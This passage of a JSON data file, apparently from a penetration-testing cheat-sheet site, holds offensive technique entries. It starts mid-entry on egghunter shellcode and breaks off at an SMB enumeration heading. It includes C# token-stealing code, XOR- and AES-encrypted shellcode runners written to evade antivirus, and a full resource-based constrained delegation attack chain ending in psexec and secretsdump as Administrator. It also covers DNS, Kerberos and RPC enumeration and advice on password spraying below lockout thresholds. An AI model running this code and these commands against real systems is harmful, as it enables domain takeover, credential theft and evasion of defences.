        "title": "Shellcode Structure with Egg",
        "codes": [
          {
            "lang": "python",
            "code": "egg = b\"w00t\"\nfull_payload = egg + egg + shellcode   # 8 bytes + shellcode\n\n# The egghunter searches for \"w00tw00t\"\n# When found, execution continues at shellcode"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How to prepend the egg to shellcode."
          }
        ]
      },
      {
        "title": "Size Considerations [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Egghunter sizes vary by implementation:\n- **NtAccessCheckAndAuditAlarm**: ~32 bytes (Windows)\n- **SEH-based egghunter**: ~60 bytes (more portable)\n- **IsBadReadPtr method**: ~37 bytes (deprecated)",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Limitations [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Egghunters have tradeoffs:\n- **Speed**: Searching all memory takes time (seconds to minutes)\n- **Reliability**: Memory layout changes between executions\n- **Detection**: Known patterns may be detected by security software\n- **Page alignment**: Must handle unmapped pages correctly",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Skape - Safely Searching Process Virtual Address Space",
        "url": "http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf"
      }
    ],
    "foundational": true,
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Egghunters are small shellcode stubs that search memory for a larger payload marked with a unique tag (egg)."
      }
    ]
  },
  {
    "category": "Access Token Attacks",
    "title": "Elevation with Impersonation",
    "tags": [
      "Credential_Access",
      "Privilege_Escalation",
      "Token_Manipulation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Token Stealing with C#",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Runtime.InteropServices;\nusing System.Diagnostics;\n\nclass TokenStealer\n{\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);\n\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);\n\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    static extern bool CloseHandle(IntPtr hHandle);\n\n    const uint TOKEN_ALL_ACCESS = 0xF01FF;\n\n    static void StealToken(int pid)\n    {\n        IntPtr hToken;\n        IntPtr hDupToken;\n\n        Process proc = Process.GetProcessById(pid);\n        OpenProcessToken(proc.Handle, TOKEN_ALL_ACCESS, out hToken);\n        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out hDupToken);\n        ImpersonateLoggedOnUser(hDupToken);\n\n        // Now running as stolen token's user\n        Console.WriteLine(System.Security.Principal.WindowsIdentity.GetCurrent().Name);\n\n        CloseHandle(hToken);\n        CloseHandle(hDupToken);\n    }\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find High-Privilege Processes",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-Process | ForEach-Object {\n    try {\n        $owner = (Get-WmiObject Win32_Process -Filter \"ProcessId=$($_.Id)\").GetOwner()\n        if ($owner.User -eq \"SYSTEM\") {\n            [PSCustomObject]@{\n                Name = $_.Name\n                PID = $_.Id\n                User = \"$($owner.Domain)\\$($owner.User)\"\n            }\n        }\n    } catch {}\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "CSharp AV Bypass",
    "title": "Encrypting the C# Shellcode Runner",
    "tags": [
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "XOR Encryption",
        "substeps": [
          {
            "title": "XOR Encrypt Shellcode",
            "codes": [
              {
                "lang": "csharp",
                "code": "byte[] buf = new byte[] { 0xfc, 0x48, 0x83, ... };\nbyte[] key = Encoding.ASCII.GetBytes(\"mysecretkey12345\");\nbyte[] encoded = new byte[buf.Length];\n\nfor (int i = 0; i < buf.Length; i++)\n{\n    encoded[i] = (byte)(buf[i] ^ key[i % key.Length]);\n}\n\n// Output as C# array\nStringBuilder sb = new StringBuilder();\nsb.Append(\"byte[] buf = new byte[\" + encoded.Length + \"] { \");\nfor (int i = 0; i < encoded.Length; i++)\n{\n    sb.Append(\"0x\" + encoded[i].ToString(\"x2\"));\n    if (i < encoded.Length - 1) sb.Append(\", \");\n}\nsb.Append(\" };\");\nConsole.WriteLine(sb.ToString());"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "XOR Decrypt at Runtime",
            "codes": [
              {
                "lang": "csharp",
                "code": "byte[] buf = new byte[<Size>] { /* XOR encrypted shellcode */ };\nbyte[] key = Encoding.ASCII.GetBytes(\"mysecretkey12345\");\n\nfor (int i = 0; i < buf.Length; i++)\n{\n    buf[i] = (byte)(buf[i] ^ key[i % key.Length]);\n}\n\n// buf now contains decrypted shellcode"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "AES Encryption",
        "substeps": [
          {
            "title": "AES Encrypt Shellcode",
            "codes": [
              {
                "lang": "csharp",
                "code": "using System.Security.Cryptography;\n\nbyte[] shellcode = new byte[] { 0xfc, 0x48, ... };\nbyte[] key = new byte[32]; // 256-bit key\nbyte[] iv = new byte[16];  // 128-bit IV\n\nusing (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())\n{\n    rng.GetBytes(key);\n    rng.GetBytes(iv);\n}\n\nusing (Aes aes = Aes.Create())\n{\n    aes.Key = key;\n    aes.IV = iv;\n    ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);\n\n    using (MemoryStream ms = new MemoryStream())\n    {\n        using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n        {\n            cs.Write(shellcode, 0, shellcode.Length);\n        }\n        byte[] encrypted = ms.ToArray();\n        // Output key, iv, and encrypted bytes\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "AES Decrypt at Runtime",
            "codes": [
              {
                "lang": "csharp",
                "code": "byte[] encrypted = new byte[] { /* AES encrypted shellcode */ };\nbyte[] key = new byte[] { /* 32 byte key */ };\nbyte[] iv = new byte[] { /* 16 byte IV */ };\n\nusing (Aes aes = Aes.Create())\n{\n    aes.Key = key;\n    aes.IV = iv;\n    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);\n\n    using (MemoryStream ms = new MemoryStream(encrypted))\n    {\n        using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))\n        {\n            byte[] decrypted = new byte[encrypted.Length];\n            int bytesRead = cs.Read(decrypted, 0, decrypted.Length);\n            // Trim to actual size\n            byte[] shellcode = new byte[bytesRead];\n            Array.Copy(decrypted, shellcode, bytesRead);\n        }\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Complete Encrypted Runner",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Runtime.InteropServices;\nusing System.Security.Cryptography;\nusing System.IO;\n\nclass Program\n{\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\n    static byte[] Decrypt(byte[] encrypted, byte[] key, byte[] iv)\n    {\n        using (Aes aes = Aes.Create())\n        {\n            aes.Key = key;\n            aes.IV = iv;\n            using (var decryptor = aes.CreateDecryptor())\n            using (var ms = new MemoryStream(encrypted))\n            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))\n            using (var output = new MemoryStream())\n            {\n                cs.CopyTo(output);\n                return output.ToArray();\n            }\n        }\n    }\n\n    static void Main()\n    {\n        byte[] encrypted = new byte[] { /* encrypted shellcode */ };\n        byte[] key = new byte[] { /* key */ };\n        byte[] iv = new byte[] { /* iv */ };\n\n        byte[] buf = Decrypt(encrypted, key, iv);\n\n        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\n        Marshal.Copy(buf, 0, addr, buf.Length);\n        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        WaitForSingleObject(hThread, 0xFFFFFFFF);\n    }\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Resource-Based Constrained Delegation (RBCD)",
    "title": "Enumerate Resource-Based Constrained Delegation (RBCD)",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enumeration with BloodHound",
        "codes": [
          {
            "lang": "cypher",
            "code": "# Find write access to computers\nMATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer) RETURN p"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumeration with PowerView",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { \n  $_.ActiveDirectoryRights -match \"WriteProperty|GenericAll|GenericWrite\" \n}"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Check MachineAccountQuota",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p <Pass> -M maq"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Existing RBCD Configurations",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Impacket",
        "codes": [
          {
            "lang": "bash",
            "code": "findDelegation.py <Domain>/<User>:<Pass> -dc-ip <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Exploit RBCD",
        "substeps": [
          {
            "title": "Step 1 - Create a machine account",
            "codes": [
              {
                "lang": "bash",
                "code": "addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-host <DC_IP> <Domain>/<User>:<Pass>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 2 - Configure RBCD on target",
            "codes": [
              {
                "lang": "bash",
                "code": "rbcd.py -delegate-from 'YOURPC$' -delegate-to '<TargetComputer>$' -action write <Domain>/<User>:<Pass>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 3 - Get service ticket as admin",
            "codes": [
              {
                "lang": "bash",
                "code": "getST.py -spn cifs/<Target_domain_local> -impersonate Administrator <Domain>/YOURPC$:'Password123!'"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Step 4 - Use the ticket",
            "codes": [
              {
                "lang": "bash",
                "code": "export KRB5CCNAME=Administrator.ccache"
              },
              {
                "lang": "bash",
                "code": "impacket-psexec -k -no-pass <Target_domain_local>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "NetExec with RBCD Module",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u <User> -p '<Pass>' -M rbcd -o action=write delegate_from=YOURPC$ delegate_to=<TargetComputer>$"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Automated RBCD attack using **NetExec**.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Rubeus S4U Attack",
            "codes": [
              {
                "lang": "powershell",
                "code": ".\\Rubeus.exe s4u /user:YOURPC$ /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:cifs/<Target_domain_local> /ptt"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Validate Access",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <Target_domain_local> -u Administrator -k --use-kcache"
              },
              {
                "lang": "bash",
                "code": "impacket-secretsdump -k -no-pass <Target_domain_local>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Troubleshooting:**\n- **Can't create machine account:** (MAQ = 0): Use existing machine account you control\n- **RBCD write fails:** (No write permission): Verify ACLs in **BloodHound**\n- **getST.py fails:** (S4U issues): Check account types, target must be computer\n- **Ticket doesn't work:** (Wrong SPN or hostname): Use FQDN, verify DNS",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Cleanup RBCD",
        "substeps": [
          {
            "title": "Remove RBCD configuration",
            "codes": [
              {
                "lang": "bash",
                "code": "rbcd.py -delegate-to '<TargetComputer>$' -action flush <Domain>/<User>:<Pass>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Delete machine account",
            "codes": [
              {
                "lang": "bash",
                "code": "addcomputer.py -computer-name 'YOURPC$' -delete -dc-host <DC_IP> <Domain>/<User>:<Pass>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks RBCD",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**Requirements:**\n- `GenericWrite`, `GenericAll`, `WriteDacl`, or `WriteOwner` on target computer\n- Ability to create machine account (MAQ > 0) or control of existing one\n- Network access to target (port 445)",
        "variant": "important"
      },
      {
        "type": "note",
        "content": "If you have write access to a computer object, configure it to trust a machine you control, then impersonate admin users to it.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Enumerate Shadow Copies",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "List Shadow Copies with vssadmin",
        "codes": [
          {
            "lang": "powershell",
            "code": "vssadmin list shadows"
          },
          {
            "lang": "text",
            "code": "Shadow Copy Volume: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n   Original Volume: (C:)\n   Shadow Copy ID: {12345678-1234-1234-1234-123456789012}\n   Creation Time: 1/15/2024 3:45:23 PM"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Shadow Copies with WMI",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-WmiObject Win32_ShadowCopy | Select-Object DeviceObject, InstallDate"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Shadow Copies with PowerShell",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-CimInstance Win32_ShadowCopy"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "DNS Enumeration",
    "title": "Enumerating DNS (No Credentials)",
    "tags": [
      "Active_Directory",
      "DNS",
      "Discovery",
      "Enumeration",
      "Windows"
    ],
    "steps": [
      {
        "title": "Basic DNS Queries",
        "substeps": [
          {
            "title": "host Command (Linux)",
            "codes": [
              {
                "lang": "bash",
                "code": "host <Domain>"
              },
              {
                "lang": "bash",
                "code": "host -t mx <Domain>"
              },
              {
                "lang": "bash",
                "code": "host -t txt <Domain>"
              },
              {
                "lang": "bash",
                "code": "host -t ns <Domain>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "nslookup (Windows)",
            "codes": [
              {
                "lang": "bash",
                "code": "nslookup <Hostname>"
              },
              {
                "lang": "bash",
                "code": "nslookup -type=<RecordType> <Hostname> <DNSServer>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Built-in Windows DNS query tool. Useful for Living off the Land scenarios.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Zone Transfer",
        "codes": [
          {
            "lang": "bash",
            "code": "dig axfr @<DC_IP> <Domain_Local>"
          },
          {
            "lang": "bash",
            "code": "host -t axfr <Domain_Local> <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DC Discovery via SRV Records",
        "codes": [
          {
            "lang": "bash",
            "code": "dig SRV _ldap._tcp.dc._msdcs.<Domain_Local> @<DC_IP>"
          },
          {
            "lang": "bash",
            "code": "dig SRV _kerberos._tcp.<Domain_Local> @<DC_IP>"
          },
          {
            "lang": "bash",
            "code": "nslookup -type=SRV _ldap._tcp.<Domain_Local>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Subdomain Enumeration",
        "substeps": [
          {
            "title": "Forward DNS Brute Force",
            "codes": [
              {
                "lang": "bash",
                "code": "for sub in $(cat <Wordlist>); do host $sub.<Domain>; done | grep -v \"not found\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Uses a wordlist of common subdomain names. **SecLists** has comprehensive wordlists at `/usr/share/seclists/Discovery/DNS/`.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "Reverse DNS Lookup",
            "codes": [
              {
                "lang": "bash",
                "code": "for ip in $(seq <Start> <End>); do host <NetworkPrefix>.$ip; done | grep -v \"not found\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Scan an IP range to discover hostnames via PTR records.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DNS Enumeration Tools",
        "substeps": [
          {
            "title": "DNSRecon Standard Scan",
            "codes": [
              {
                "lang": "bash",
                "code": "dnsrecon -d <Domain_Local> -t std"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Retrieves SOA, NS, MX, TXT records and checks DNSSEC.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "DNSRecon Brute Force",
            "codes": [
              {
                "lang": "bash",
                "code": "dnsrecon -d <Domain> -D <Wordlist> -t brt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "DNSenum",
            "codes": [
              {
                "lang": "bash",
                "code": "dnsenum <Domain_Local>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "DNSenum with Custom Wordlist",
            "codes": [
              {
                "lang": "bash",
                "code": "dnsenum --dnsserver <DNSServer> -f <Wordlist> <Domain>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks DNS Enumeration",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**What you're looking for:**\n- Domain Controller hostnames and IPs\n- Additional domain-joined hosts\n- Subdomains and service records\n- Zone transfer misconfigurations (rare but valuable)",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**What to look for in output:**\n- `_ldap._tcp.dc._msdcs` records \u2192 Domain Controller locations\n- `_kerberos._tcp` records \u2192 Kerberos KDC (usually DC)\n- `_gc._tcp` records \u2192 Global Catalog servers\n- Multiple A records for same name \u2192 Potential load balancers or clusters",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Just Enough Administration (JEA)",
    "title": "Enumerating JEA",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "Find JEA Endpoints",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-PSSessionConfiguration | Where-Object { $_.RunAsVirtualAccount -eq $true }"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Connect to JEA Session",
        "codes": [
          {
            "lang": "powershell",
            "code": "Enter-PSSession -ComputerName <Target> -ConfigurationName <JEAEndpoint>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "List Available Commands",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-Command"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check Session Capabilities",
        "codes": [
          {
            "lang": "powershell",
            "code": "$ExecutionContext.SessionState.LanguageMode\nGet-PSSessionCapability -ConfigurationName <JEAEndpoint> -Username <Domain>\\<User>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Just-In-Time (JIT) Access",
    "title": "Enumerating JIT",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "Find PAM Trust",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADTrust -Filter { ForestTransitive -eq $true }"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Identify Shadow Forest",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Look for trusts to priv.domain.local or similar\nGet-ADForest | Select-Object -ExpandProperty Domains"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Find Shadow Principals",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADObject -Filter { objectClass -eq \"foreignSecurityPrincipal\" } -Server <PAMForest>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check Group Membership TTL",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADGroup \"Shadow Admins\" -Properties member, msDS-MembersOfResourceProperty -Server <PAMForest>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Kerberos User Enumeration",
    "title": "Enumerating Kerberos Users (No Credentials)",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Kerbrute for Valid Users",
        "codes": [
          {
            "lang": "bash",
            "code": "kerbrute userenum --dc '<DC_IP>' -d '<Domain_Local>' /root/machines/<Machine>/<TargetIP>/usernames"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Nmap Kerberos Enumeration",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<Domain_Local>',userdb=/root/machines/<Machine>/<TargetIP>/usernames <DC-IP>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks Kerberos User Enumeration",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**What you're looking for:**\n- Valid usernames (confirmed by Kerberos responses)\n- ASREPRoastable users (no pre-auth)\n- This works WITHOUT any credentials!",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**Recommended wordlists for user enumeration:**\n- `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`\n- Custom list based on company naming convention (e.g., first.last, flast, firstl)\n- Names from LinkedIn, company website, OSINT",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "RPC Enumeration",
    "title": "Enumerating RPC (With Credentials)",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "RPC",
      "Windows"
    ],
    "steps": [
      {
        "title": "RPC Client",
        "substeps": [
          {
            "title": "RPC Client > List All Domain Users",
            "codes": [
              {
                "lang": "bash",
                "code": "enumdomusers"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > List All Domain Groups",
            "codes": [
              {
                "lang": "bash",
                "code": "enumdomgroups"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Query Domain Admins (RID 512 = 0x200)",
            "codes": [
              {
                "lang": "bash",
                "code": "querygroup 0x200"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Members of Domain Admins",
            "codes": [
              {
                "lang": "bash",
                "code": "querygroupmem 0x200"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Password Policy",
            "codes": [
              {
                "lang": "bash",
                "code": "getdompwinfo"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "**Password Policy - What to look for:**\n- `Minimum password length: 7` - Weak if less than 8\n- `Password history: 24` - Number of remembered passwords\n- `Lockout threshold: 5` - **CRITICAL** - don't exceed this!\n- `Lockout duration: 30 minutes` - How long until unlock\n- `Lockout observation window: 30` - Window for counting failures",
                "variant": "warning"
              },
              {
                "type": "note",
                "content": "**Always check password policy before spraying!** If lockout threshold is 5, spray maximum 3-4 passwords to be safe.",
                "variant": "danger"
              }
            ]
          },
          {
            "title": "RPC Client > Get SID for Specific User",
            "codes": [
              {
                "lang": "bash",
                "code": "lookupnames admin"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Resolve SID to name",
            "codes": [
              {
                "lang": "bash",
                "code": "lookupsids S-1-5-21-...-500"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Enumerate Privileges",
            "codes": [
              {
                "lang": "bash",
                "code": "enumpriv"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > User Password Policy",
            "codes": [
              {
                "lang": "bash",
                "code": "getuserdompwinfo <UserRID>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Get user RID from queryuser first.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "RPC Client > Server Information",
            "codes": [
              {
                "lang": "bash",
                "code": "srvinfo"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Enumerate All SIDs",
            "codes": [
              {
                "lang": "bash",
                "code": "lsaenumsid"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Enumerate Domains",
            "codes": [
              {
                "lang": "bash",
                "code": "enumdomains"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Enumerate Shares",
            "codes": [
              {
                "lang": "bash",
                "code": "netshareenumall"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > User Descriptions",
            "codes": [
              {
                "lang": "bash",
                "code": "querydispinfo"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Create Domain User",
            "codes": [
              {
                "lang": "bash",
                "code": "createdomuser <NewUsername>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RPC Client > Delete Domain User",
            "codes": [
              {
                "lang": "bash",
                "code": "deletedomuser <Username>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "rpcclient -U '<Domain_Local>/<Username>%<Password>' <TargetIP>"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SMB Enumeration",
    "title": "Enumerating SMB (With Credentials)",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "SMB",
      "Windows"
    ],
    "steps": [
      {
